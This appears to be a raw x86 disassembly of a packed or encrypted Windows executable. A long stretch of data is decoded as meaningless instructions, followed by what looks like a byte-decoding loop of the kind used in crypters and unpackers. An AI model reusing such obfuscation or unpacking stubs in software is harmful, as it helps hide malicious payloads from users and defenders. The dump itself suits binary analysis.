  4163f1:	inc    eax
  4163f2:	(bad)  [ebx+eiz*4]
  4163f5:	sbb    DWORD PTR [ebp+0x5a921ea6],edx
  4163fb:	dec    ebx
  4163fc:	out    dx,al
  4163fd:	inc    esp
  4163fe:	cmp    BYTE PTR [ebx-0x3c2df744],dh
  416404:	xchg   ecx,eax
  416405:	adc    al,0xcc
  416407:	add    al,0x2d
  416409:	sbb    al,BYTE PTR ds:0xdfaaa5b1
  41640f:	xor    DWORD PTR [ebx],eax
  416411:	push   0xc952523b
  416416:	xor    edx,0xe89d5091
  41641c:	out    0x51,al
  41641e:	mov    al,0xc4
  416420:	xchg   ecx,eax
  416421:	xchg   ebp,eax
  416422:	ret    0xf24d
  416425:	ret    
  416426:	pusha  
  416427:	or     DWORD PTR [esi],0xffffff9e
  41642a:	inc    ecx
  41642b:	cmp    esp,ecx
  41642d:	punpckhbw mm6,mm1
  416430:	mov    dh,0x89
  416432:	mov    bl,0xd3
  416434:	(bad)  
  416435:	loope  0x41642e
  416437:	test   DWORD PTR [ecx+0x6029938f],edi
  41643d:	iret   
  41643e:	jo     0x416493
  416440:	leave  
  416441:	xchg   edx,eax
  416442:	xor    cl,BYTE PTR [ecx]
  416444:	ret    0x6d3c
  416447:	mov    ah,0xf7
  416449:	jae    0x4163de
  41644b:	enter  0x5a12,0x72
  41644f:	add    al,0xa9
  416451:	imul   esp,DWORD PTR [edi+0x64a055b9],0xffffffbc
  416458:	cmp    BYTE PTR [eax],dl
  41645a:	xchg   ebp,eax
  41645b:	and    DWORD PTR ds:0x1abb1799,esi
  416461:	mov    WORD PTR [edx+0x30],fs
  416464:	dec    edx
  416465:	xor    al,0x1a
  416467:	inc    ecx
  416468:	sbb    BYTE PTR [esi+esi*4+0x37],0xcc
  41646d:	or     al,0xca
  41646f:	mov    dl,0x15
  416471:	mov    eax,0x5f84479b
  416476:	pushf  
  416477:	popa   
  416478:	xor    ah,cl
  41647a:	pop    edx
  41647b:	lea    ebp,[ebp+0x4e6758e9]
  416481:	sub    eax,0xc21b3c5c
  416486:	sti    
  416487:	mov    ecx,0x783a6c0c
  41648c:	xchg   edi,eax
  41648d:	aam    0x29
  41648f:	repnz xchg ebp,eax
  416491:	hlt    
  416492:	jmp    0x4367:0xf537e831
  416499:	ret    
  41649a:	sbb    BYTE PTR [ebx+0x43],dl
  41649d:	out    dx,eax
  41649e:	push   ebx
  41649f:	xchg   esp,eax
  4164a0:	sub    eax,0x2ce94fb6
  4164a5:	jnp    0x4164ce
  4164a7:	cld    
  4164a8:	xchg   esp,eax
  4164a9:	loopne 0x4164f4
  4164ab:	sar    ch,cl
  4164ad:	std    
  4164ae:	push   ecx
  4164af:	adc    al,BYTE PTR [ebx]
  4164b1:	ss in  eax,dx
  4164b3:	sti    
  4164b4:	pop    ecx
  4164b5:	or     BYTE PTR [eax+ebp*8],0x23
  4164b9:	out    dx,al
  4164ba:	outs   dx,BYTE PTR ds:[esi]
  4164bb:	loopne 0x416519
  4164bd:	xchg   edx,eax
  4164be:	pusha  
  4164bf:	push   0x721aec37
  4164c4:	mov    eax,0xe322cf16
  4164c9:	fiadd  WORD PTR [ebp+edi*4+0x4e]
  4164cd:	mov    ebp,DWORD PTR [ecx-0x47]
  4164d0:	iret   
  4164d1:	mov    ss,WORD PTR [ebp+0x480748e2]
  4164d7:	dec    esp
  4164d8:	das    
  4164d9:	rcr    BYTE PTR [esi+0x1b],0xd3
  4164dd:	bound  eax,QWORD PTR [ebp+0x6ec82dd5]
  4164e3:	adc    eax,DWORD PTR ss:[edx+0x7e]
  4164e7:	popf   
  4164e8:	push   ds
  4164e9:	jno    0x4164fd
  4164eb:	push   ebp
  4164ec:	fst    DWORD PTR [ebp+0x4d1a9cef]
  4164f2:	mov    ch,dh
  4164f4:	xor    al,BYTE PTR [esi+edx*2+0x23]
  4164f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164f9:	sbb    edx,DWORD PTR [ebx-0xa3cb1f1]
  4164ff:	mov    ebp,DWORD PTR [esi+0x72]
  416502:	loopne 0x4164fd
  416504:	cmp    DWORD PTR [ebp+0x5f7cc520],0x3588d3ae
  41650e:	or     ebx,DWORD PTR ds:0x14ee7e20
  416514:	mov    edx,0xaaf0eaab
  416519:	cmp    BYTE PTR [ebx],al
  41651b:	inc    ebx
  41651c:	mov    DWORD PTR [ebx+0x4ac443db],ebx
  416522:	test   edx,esp
  416524:	mov    BYTE PTR [edi+0x7f],ah
  416527:	sbb    DWORD PTR [esi-0x33],esi
  41652a:	sbb    eax,0x58943dac
  41652f:	pop    esp
  416530:	(bad)  
  416532:	retf   
  416533:	xchg   esi,eax
  416534:	jne    0x41659d
  416536:	jb     0x4164c7
  416538:	sbb    eax,0x4c941443
  41653d:	in     al,dx
  41653e:	push   ebp
  41653f:	cmp    cl,ch
  416541:	mov    ah,0x9
  416543:	call   0xdd2f:0x999342d9
  41654a:	lods   al,BYTE PTR ds:[esi]
  41654b:	jb     0x41653a
  41654d:	div    DWORD PTR [eax-0x459fb73d]
  416553:	lods   al,BYTE PTR ds:[esi]
  416554:	fwait
  416555:	mov    bh,0x51
  416557:	ds jle 0x416598
  41655a:	lahf   
  41655b:	pop    esi
  41655c:	or     eax,0xbd072159
  416561:	or     DWORD PTR [edi+0x18177d58],esi
  416567:	ds scas al,BYTE PTR es:[edi]
  416569:	push   es
  41656a:	fnstcw WORD PTR [ecx]
  41656c:	mov    edx,0x26c3876c
  416571:	pushf  
  416572:	fadd   DWORD PTR [ebp+0x8]
  416575:	add    ebx,DWORD PTR [edi+edi*2]
  416578:	push   ecx
  416579:	push   edi
  41657a:	les    ecx,FWORD PTR [esi+0x64858040]
  416580:	mov    BYTE PTR ds:0xe6940dfc,ch
  416586:	out    0xbd,al
  416588:	out    0x83,al
  41658a:	cs pop eax
  41658c:	cmp    BYTE PTR [edi],bl
  41658e:	fst    st(6)
  416590:	iret   
  416591:	mov    esi,DWORD PTR [ebx+0x50d197d5]
  416597:	push   edx
  416598:	inc    esp
  416599:	pop    es
  41659a:	add    BYTE PTR [ebp+esi*2-0x67],ah
  41659e:	push   0xf8c67f66
  4165a3:	mov    esp,0x595df5cc
  4165a8:	mov    ebp,0x126a0131
  4165ad:	sub    eax,0x59acdebd
  4165b2:	nop
  4165b3:	daa    
  4165b4:	lahf   
  4165b5:	ss rol dh,cl
  4165b8:	cs loope 0x41658d
  4165bb:	es adc al,0x2d
  4165be:	and    BYTE PTR [ebp+ebx*4+0x46b3c73e],al
  4165c5:	sar    DWORD PTR [eax+0x6d],cl
  4165c8:	out    dx,eax
  4165c9:	aad    0x5
  4165cb:	jmp    0x41662e
  4165cd:	xchg   ebx,eax
  4165ce:	pop    edi
  4165cf:	dec    ecx
  4165d0:	cmc    
  4165d1:	jle    0x41659a
  4165d3:	jmp    0xb555:0x2ff839c5
  4165da:	loop   0x416584
  4165dc:	xor    al,bl
  4165de:	hlt    
  4165df:	cmc    
  4165e0:	pop    eax
  4165e1:	push   edx
  4165e2:	sbb    al,0xe1
  4165e4:	jo     0x416662
  4165e6:	(bad)  
  4165e7:	mov    bh,0x10
  4165e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165ea:	pushf  
  4165eb:	mov    al,ds:0x7f7306e2
  4165f0:	(bad)  
  4165f1:	xchg   ecx,eax
  4165f2:	jl     0x4165dc
  4165f4:	adc    al,BYTE PTR [esi-0x72]
  4165f7:	mov    al,ds:0xbe89477f
  4165fc:	mov    esp,0x30109b5b
  416601:	jge    0x4165bf
  416603:	(bad)  
  416604:	arpl   WORD PTR [ecx-0x6f033c8f],si
  41660a:	cmc    
  41660b:	imul   ebx,ebx,0xffffffec
  41660e:	out    dx,eax
  41660f:	stc    
  416610:	mov    ah,0x64
  416612:	add    edi,ecx
  416614:	js     0x416661
  416616:	mov    ds:0x6f6f3774,eax
  41661b:	addr16 jge 0x4165db
  41661e:	call   FWORD PTR [edi-0x5ae75d89]
  416624:	inc    ebp
  416625:	xchg   edx,eax
  416626:	(bad)  
  416627:	call   0x5c62:0xc75613c
  41662e:	das    
  41662f:	and    al,0xc7
  416631:	outs   dx,BYTE PTR ds:[esi]
  416632:	mov    esp,0x36066f75
  416637:	cmp    eax,0x8d9c0609
  41663c:	inc    ecx
  41663d:	test   al,0xda
  41663f:	and    ah,cl
  416641:	mov    ds:0x4c195b28,al
  416646:	es push 0xcae1dea0
  41664c:	sub    al,0xa1
  41664e:	test   al,0x7d
  416650:	xchg   bh,dh
  416652:	mov    dl,0xb1
  416654:	fistp  WORD PTR [edx+0x3de9083b]
  41665a:	push   ebx
  41665b:	aam    0xce
  41665d:	ficomp DWORD PTR [esi]
  41665f:	retf   0x490c
  416662:	sbb    al,0xc5
  416664:	push   ds
  416665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416666:	xchg   ebp,edx
  416668:	cmp    eax,0x6eed15c4
  41666d:	mov    cs,WORD PTR [edx+0x5638368c]
  416673:	cld    
  416674:	push   edx
  416675:	mov    ch,0x76
  416677:	popf   
  416678:	adc    al,0x0
  41667a:	xor    BYTE PTR [ebp-0x7e],cl
  41667d:	stos   BYTE PTR es:[edi],al
  41667e:	add    esi,esi
  416680:	lahf   
  416681:	mov    dl,0x3c
  416683:	mov    ecx,0xb6ebde3c
  416688:	mov    ch,0x9f
  41668a:	sbb    DWORD PTR [ebx],ecx
  41668c:	arpl   WORD PTR [ebx],di
  41668e:	je     0x4166f6
  416690:	in     eax,0xb6
  416692:	js     0x41662a
  416694:	cmp    DWORD PTR [ebx],0x45e35329
  41669a:	test   al,0x8f
  41669c:	sti    
  41669d:	retf   0x608d
  4166a0:	jns    0x4166f2
  4166a2:	sbb    ah,BYTE PTR [ecx-0x546bb411]
  4166a8:	mov    al,0xa4
  4166aa:	jo     0x416658
  4166ac:	lock inc ecx
  4166ae:	outs   dx,BYTE PTR ds:[esi]
  4166af:	test   al,0x53
  4166b1:	scas   al,BYTE PTR es:[edi]
  4166b2:	xor    esi,esi
  4166b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166b5:	jns    0x416712
  4166b7:	out    0x6e,al
  4166b9:	sar    BYTE PTR [eax+0x2a],1
  4166bc:	add    cl,BYTE PTR [ebx]
  4166be:	mov    eax,ds:0x6d63a3a1
  4166c3:	xor    eax,0x51e3540d
  4166c8:	sbb    ecx,0x2b
  4166cb:	mov    eax,0x32ae10d7
  4166d0:	int3   
  4166d1:	lea    ebx,[edi-0x314c4f52]
  4166d7:	adc    al,0x57
  4166d9:	mov    bh,BYTE PTR [ecx-0x68691988]
  4166df:	dec    eax
  4166e0:	(bad)  
  4166e1:	push   eax
  4166e2:	inc    edi
  4166e3:	hlt    
  4166e4:	mov    ecx,0x4841081a
  4166e9:	sub    al,0x64
  4166eb:	add    ebx,DWORD PTR [ebp+edx*1-0x54]
  4166ef:	in     eax,0xca
  4166f1:	add    eax,0x2a0b633e
  4166f6:	mov    cl,0xad
  4166f8:	mov    ds:0xdc5ee5ee,al
  4166fd:	aaa    
  4166fe:	jo     0x4166ca
  416700:	jmp    0x9f3a88b2
  416705:	lods   eax,DWORD PTR ds:[esi]
  416706:	adc    eax,0x7e45d4b3
  41670b:	out    0x2d,al
  41670d:	loopne 0x416699
  41670f:	adc    al,0x63
  416711:	in     al,dx
  416712:	rcl    edi,cl
  416714:	call   0x6b0668f9
  416719:	nop
  41671a:	push   ds
  41671b:	fdiv   QWORD PTR [ebx-0x4d208ed9]
  416721:	es inc ebx
  416723:	test   BYTE PTR [ebp+0x1d],bh
  416726:	push   ecx
  416727:	loopne 0x4166e5
  416729:	dec    eax
  41672a:	cmp    DWORD PTR [esi+0x2d],edx
  41672d:	jecxz  0x4167ac
  41672f:	jo     0x4166ec
  416731:	ds xor ebp,ecx
  416734:	mov    eax,0x55515e31
  416739:	xchg   edi,eax
  41673a:	ja     0x4166f8
  41673c:	test   BYTE PTR [eax-0x5edb367c],0xda
  416743:	iret   
  416744:	mov    gs,ebx
  416746:	mov    ch,0xd6
  416748:	mov    ebp,0xf0cdf352
  41674d:	(bad)  
  41674e:	and    DWORD PTR [esi+esi*8],esp
  416751:	sub    al,0xea
  416753:	test   al,0xdb
  416755:	and    ebp,DWORD PTR [ebp-0x1d]
  416758:	jne    0x41671a
  41675a:	and    al,0x37
  41675d:	pop    esp
  41675e:	jo     0x41678a
  416760:	or     al,0x2b
  416762:	mov    edi,0x87f736d3
  416767:	jecxz  0x4167cf
  416769:	outs   dx,BYTE PTR ds:[esi]
  41676a:	xor    DWORD PTR [edi-0x499d1f24],esp
  416770:	stos   DWORD PTR es:[edi],eax
  416771:	jl     0x41672d
  416773:	fwait
  416774:	inc    esi
  416775:	xlat   BYTE PTR ds:[ebx]
  416776:	paddq  mm7,QWORD PTR [ebx-0x923608e]
  41677d:	test   BYTE PTR [edi+0x3a],al
  416780:	outs   dx,BYTE PTR ds:[esi]
  416781:	push   esp
  416782:	mov    edx,0xd2633972
  416787:	inc    ebp
  416788:	popa   
  416789:	inc    ebp
  41678a:	cdq    
  41678b:	mov    ecx,0x24628892
  416790:	jo     0x4167f2
  416792:	aas    
  416793:	jg     0x41676f
  416795:	and    BYTE PTR [ebx],0xe0
  416798:	call   0x6859:0x3fd51ee6
  41679f:	sbb    ebx,DWORD PTR [edx+0x5d04bbd2]
  4167a5:	xchg   ecx,eax
  4167a6:	in     al,dx
  4167a7:	in     al,0x97
  4167a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167aa:	ja     0x416748
  4167ac:	pushf  
  4167ad:	and    BYTE PTR [ebx+edi*4+0x26],dh
  4167b1:	push   esp
  4167b2:	mov    ecx,0xee5a9ca
  4167b7:	inc    edx
  4167b8:	arpl   WORD PTR [esi+0x1a],dx
  4167bb:	aam    0xa7
  4167bd:	inc    ecx
  4167be:	cmp    eax,0xbc620777
  4167c3:	inc    esp
  4167c4:	jne    0x41674a
  4167c6:	inc    ebx
  4167c7:	mov    ds:0x5af06291,al
  4167cc:	out    dx,al
  4167cd:	xchg   edi,eax
  4167ce:	int    0xb5
  4167d0:	fldcw  WORD PTR [edx]
  4167d2:	jbe    0x4167b6
  4167d4:	or     BYTE PTR [eax],al
  4167d6:	test   al,0x43
  4167d8:	xchg   esp,eax
  4167d9:	mov    ds:0x9f79206a,eax
  4167de:	mul    cl
  4167e0:	loopne 0x416832
  4167e2:	push   cs
  4167e3:	test   eax,0x7b376645
  4167e8:	out    dx,eax
  4167e9:	push   esi
  4167ea:	push   edi
  4167ec:	sub    esi,eax
  4167ee:	pop    ecx
  4167ef:	push   edi
  4167f0:	dec    eax
  4167f1:	xor    al,0x79
  4167f3:	ds call 0x6434:0x1e5216ed
  4167fb:	leave  
  4167fc:	dec    ecx
  4167fd:	mov    ebp,0x200a2977
  416802:	jmp    0x416845
  416804:	push   ebp
  416805:	xor    DWORD PTR [edi],esi
  416807:	das    
  416808:	xchg   edi,eax
  416809:	sub    ebp,ebx
  41680b:	das    
  41680c:	push   ss
  41680d:	bound  edx,QWORD PTR [edx+0xe]
  416810:	loop   0x416844
  416812:	(bad)  
  416813:	xchg   esi,eax
  416814:	sbb    al,0x7f
  416816:	nop
  416817:	mov    al,0x65
  416819:	inc    DWORD PTR [edx-0x26]
  41681c:	dec    eax
  41681d:	vminps xmm5,xmm2,XMMWORD PTR [ebx]
  416821:	and    edi,eax
  416823:	into   
  416824:	xor    al,0x25
  416826:	fs js  0x41680a
  416829:	xchg   edx,eax
  41682a:	mov    dh,0xa6
  41682c:	push   ebp
  41682d:	hlt    
  41682e:	jnp    0x416899
  416830:	ret    0x99a8
  416833:	jmp    0x416839
  416835:	icebp  
  416836:	out    dx,eax
  416837:	cmp    esp,DWORD PTR [eax-0xf94cf6f]
  41683d:	jp     0x416834
  41683f:	ins    BYTE PTR es:[edi],dx
  416840:	(bad)  
  416842:	pushf  
  416843:	out    0x3c,al
  416845:	add    bl,dh
  416847:	pop    ds
  416848:	stos   DWORD PTR es:[edi],eax
  416849:	xchg   ebp,eax
  41684a:	mov    eax,0x139d0e7f
  41684f:	push   esi
  416850:	adc    eax,0xc90ab39f
  416855:	mov    al,0xc9
  416857:	nop
  416858:	dec    edx
  416859:	mov    eax,DWORD PTR [ebx+ebp*8-0x7d791c04]
  416860:	pop    ds
  416861:	and    ebp,DWORD PTR [esi+0x12]
  416864:	outs   dx,BYTE PTR ds:[esi]
  416865:	pushf  
  416866:	xchg   esi,eax
  416867:	stos   BYTE PTR es:[edi],al
  416868:	(bad)  
  416869:	outs   dx,BYTE PTR ds:[esi]
  41686a:	pop    ebp
  41686b:	push   0xf63fab46
  416870:	fdivr  QWORD PTR [esi-0x31]
  416873:	xchg   edx,eax
  416874:	sbb    BYTE PTR [edi+0x2c],dh
  416877:	mov    ds:0xc73046b,al
  41687c:	jo     0x4168a3
  41687e:	(bad)  
  41687f:	push   ss
  416880:	adc    DWORD PTR [edx+0x6c],ecx
  416883:	adc    DWORD PTR [ecx+0x75],ebx
  416886:	push   0x4
  416888:	div    bl
  41688a:	add    al,0x18
  41688c:	push   edi
  41688d:	clc    
  41688e:	adc    DWORD PTR [esi],ebp
  416890:	cld    
  416891:	je     0x416852
  416893:	fucomp st(1)
  416895:	stc    
  416896:	rcl    esi,1
  416898:	ret    0xdd19
  41689b:	xor    edx,edx
  41689d:	adc    ch,BYTE PTR [eax+0x16f65590]
  4168a3:	push   esp
  4168a4:	dec    esp
  4168a5:	mov    al,ds:0x15022e3e
  4168aa:	pop    ebx
  4168ab:	cld    
  4168ac:	in     al,dx
  4168ad:	test   BYTE PTR [eax+0x424d6558],cl
  4168b3:	and    eax,0x86d2f996
  4168b8:	dec    edx
  4168b9:	dec    eax
  4168ba:	inc    ebp
  4168bb:	mov    edi,0xc258cd8
  4168c0:	push   es
  4168c1:	ja     0x41686f
  4168c3:	sbb    ch,dh
  4168c5:	push   0x15
  4168c7:	and    eax,0x7b63dddc
  4168cc:	sub    BYTE PTR cs:[edx],0x2b
  4168d0:	test   DWORD PTR [ecx-0x67ae0131],esi
  4168d6:	jb     0x416882
  4168d8:	lock sub ch,0x61
  4168dc:	jp     0x41693f
  4168de:	fiadd  WORD PTR [edx+0x76413c9f]
  4168e4:	ret    0xbdee
  4168e7:	test   al,0x18
  4168e9:	jmp    0x2d96:0xb39655ba
  4168f0:	push   0xceceb17c
  4168f5:	jne    0x4168c2
  4168f7:	fstp   QWORD PTR [ebp-0x67c5c524]
  4168fd:	mov    edx,fs
  4168ff:	and    BYTE PTR [ecx],cl
  416901:	loope  0x416935
  416903:	(bad)  
  416904:	mov    ds:0x98458412,eax
  416909:	xchg   edi,eax
  41690a:	xor    al,0x30
  41690c:	push   cs
  41690d:	jp     0x4168f0
  41690f:	out    0x9a,al
  416911:	lods   al,BYTE PTR ds:[esi]
  416912:	pop    edx
  416913:	jp     0x4168e0
  416915:	inc    ecx
  416916:	lods   eax,DWORD PTR ds:[esi]
  416917:	fld    QWORD PTR [ecx]
  416919:	adc    BYTE PTR [esi+0x17],bh
  41691c:	adc    DWORD PTR [ebx],0x946ee63c
  416922:	jbe    0x4168cc
  416924:	mov    al,0x88
  416926:	or     eax,ebp
  416928:	inc    ebp
  416929:	inc    ecx
  41692a:	push   esp
  41692b:	adc    DWORD PTR [esi],esp
  41692d:	jge    0x41691a
  41692f:	mov    ds:0x411d56d5,eax
  416934:	(bad)  
  416935:	iret   
  416936:	lahf   
  416937:	mov    cl,0xf6
  416939:	sub    eax,0xe86e8f8
  41693e:	mov    esi,DWORD PTR [ebp-0x4]
  416941:	call   esi
  416943:	mov    DWORD PTR [ebp-0x38],eax
  416946:	cmp    DWORD PTR [ebp-0x38],0x57
  41694a:	jne    0x416958
  41694c:	mov    edx,DWORD PTR [ebp-0x20]
  41694f:	push   edx
  416950:	call   0x401000
  416955:	add    esp,0x4
  416958:	xor    eax,eax
  41695a:	pop    esi
  41695b:	mov    esp,ebp
  41695d:	pop    ebp
  41695e:	ret    
  41695f:	push   ebp
  416960:	mov    ebp,esp
  416962:	sub    esp,0x124
  416968:	xor    eax,eax
  41696a:	mov    esp,ebp
  41696c:	pop    ebp
  41696d:	ret    
  41696e:	push   ebp
  41696f:	mov    ebp,esp
  416971:	sub    esp,0x2c
  416974:	push   ebx
  416975:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41697c:	mov    DWORD PTR [ebp-0xc],0x0
  416983:	mov    DWORD PTR [ebp-0x20],0x1
  41698a:	mov    DWORD PTR [ebp-0x10],0x0
  416991:	mov    eax,DWORD PTR [ebp+0xc]
  416994:	mov    DWORD PTR [ebp-0x1c],eax
  416997:	mov    DWORD PTR [ebp-0x18],0x0
  41699e:	mov    DWORD PTR [ebp-0x8],0x0
  4169a5:	mov    DWORD PTR [ebp-0x24],0x0
  4169ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4169af:	sub    ecx,0x1
  4169b2:	mov    DWORD PTR [ebp-0x4],ecx
  4169b5:	mov    edx,DWORD PTR [ebp+0x8]
  4169b8:	mov    DWORD PTR [ebp-0x10],edx
  4169bb:	mov    DWORD PTR [ebp-0x28],0x1
  4169c2:	mov    eax,DWORD PTR [ebp-0x4]
  4169c5:	add    eax,0x2
  4169c8:	mov    DWORD PTR [ebp-0x4],eax
  4169cb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4169ce:	add    ecx,DWORD PTR [ebp-0x4]
  4169d1:	mov    dl,BYTE PTR [ecx+0x1]
  4169d4:	mov    BYTE PTR [ebp-0x11],dl
  4169d7:	mov    eax,DWORD PTR [ebp-0x4]
  4169da:	add    eax,0x1
  4169dd:	mov    DWORD PTR [ebp-0x4],eax
  4169e0:	mov    cl,BYTE PTR [ebp-0x11]
  4169e3:	mov    BYTE PTR [ebp-0x29],cl
  4169e6:	push   edx
  4169e7:	pop    ebx
  4169e8:	mov    ecx,ebx
  4169ea:	mov    edx,DWORD PTR [ebp-0x10]
  4169ed:	add    edx,DWORD PTR [ebp-0x4]
  4169f0:	mov    al,BYTE PTR [ebp-0x29]
  4169f3:	mov    BYTE PTR [edx],al
  4169f5:	mov    ebx,esi
  4169f7:	mov    ecx,DWORD PTR [ebp+0x14]
  4169fa:	add    ecx,DWORD PTR [ebp-0x8]
  4169fd:	movzx  edx,BYTE PTR [ecx]
  416a00:	mov    DWORD PTR [ebp-0xc],edx
  416a03:	mov    eax,DWORD PTR [ebp-0x8]
  416a06:	mov    ecx,DWORD PTR [ebp-0x28]
  416a09:	add    eax,ecx
  416a0b:	mov    DWORD PTR [ebp-0x8],eax
  416a0e:	mov    eax,DWORD PTR [ebp-0x8]
  416a11:	shr    eax,0x3
  416a14:	mov    ecx,0x1
  416a19:	sub    ecx,eax
  416a1b:	mov    DWORD PTR [ebp-0x20],ecx
  416a1e:	shr    eax,cl
  416a20:	mov    edx,DWORD PTR [ebp-0x8]
  416a23:	imul   edx,DWORD PTR [ebp-0x20]
  416a27:	mov    DWORD PTR [ebp-0x8],edx
  416a2a:	shl    ebx,0x3
  416a2d:	mov    eax,DWORD PTR [ebp-0x10]
  416a30:	add    eax,DWORD PTR [ebp-0x4]
  416a33:	movzx  ecx,BYTE PTR [eax]
  416a36:	add    ecx,DWORD PTR [ebp-0xc]
  416a39:	mov    edx,DWORD PTR [ebp-0x10]
  416a3c:	add    edx,DWORD PTR [ebp-0x4]
  416a3f:	mov    BYTE PTR [edx],cl
  416a41:	mov    eax,DWORD PTR [ebp-0x4]
  416a44:	sub    eax,0x2
  416a47:	mov    DWORD PTR [ebp-0x4],eax
  416a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  416a4d:	cmp    ecx,DWORD PTR [ebp+0x10]
  416a50:	jl     0x4169c2
  416a56:	pop    ebx
  416a57:	mov    esp,ebp
  416a59:	pop    ebp
  416a5a:	ret    
  416a5b:	int3   
  416a5c:	jmp    DWORD PTR ds:0x417008
